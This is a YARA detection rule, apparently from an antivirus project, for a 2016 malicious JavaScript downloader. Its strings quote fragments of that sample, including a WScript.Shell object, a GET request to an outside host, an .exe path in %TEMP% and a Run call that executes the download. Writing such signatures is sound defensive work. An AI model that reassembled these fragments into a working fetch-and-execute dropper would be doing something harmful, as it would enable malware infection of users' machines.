rule sig_20160328_0e578cea63b69040e42cc70c6c32171a {
  meta:
    description = "datamaliciousorder - file 20160328_0e578cea63b69040e42cc70c6c32171a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "00060f77d12df96befaa4ef8dbcfeb63a1c785e78b7de1f6821edf38ca1ee399"

  strings:
    $s1  = "function Mpnymkcqo() {return Fpjbke[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QhLfaNyv4JC2xG6.exe\";};" fullword ascii
    $s2  = "do {WScript[Xddemsclwf](Pmyjmnkcvy() * 11)} while (Cuxjt[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Cuxjt[Tqsdupb](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s4  = "function Ncrhvdijuq(Hzpjpkp, Bnfvay){return Hzpjpkp - Bnfvay;};" fullword ascii
    $s5  = "var Fpjbke = function Bbbpqvqbd() {return WScript[Zrwmkcaew](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bxkollefib() {return ((Ospdkd == true) && (Ospdkd == Mrfigcey)) ? 1 : Awffjzjtz;};" fullword ascii
    $s7  = "function Tzpyjcqlw(Yhdazdzy){Fpjbke[\"Run\"](Yhdazdzy, Awffjzjtz, Awffjzjtz);};" fullword ascii
    $s8  = "Ospdkd = true; " fullword ascii
    $s9  = "var Vqvwetyr = false;" fullword ascii
    $s10 = "function Ohtfvoepfq(){return Cymcmsk;};" fullword ascii
    $s11 = "Mrfigcey = true; " fullword ascii
    $s12 = " while (Lpbwzgnqd){" fullword ascii
    $s13 = "var Mrfigcey = false;" fullword ascii
    $s14 = "var Ddupl = new this[\"Date\"]();" fullword ascii
    $s15 = "function Jfhquja()" fullword ascii
    $s16 = "function Vkrfe(Ldqqfoohj) {var Qxqffod = (1, 2, 3, 4, 5, Ldqqfoohj); return Qxqffod;};" fullword ascii
    $s17 = "function Pmyjmnkcvy(){return 22;};" fullword ascii
    $s18 = "var Ospdkd = false;" fullword ascii
    $s19 = "return Ncrhvdijuq(Wifvgqn, Dtpmvpw);" fullword ascii
    $s20 = "} catch(Ktoffynkyj){Lpbwzgnqd = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}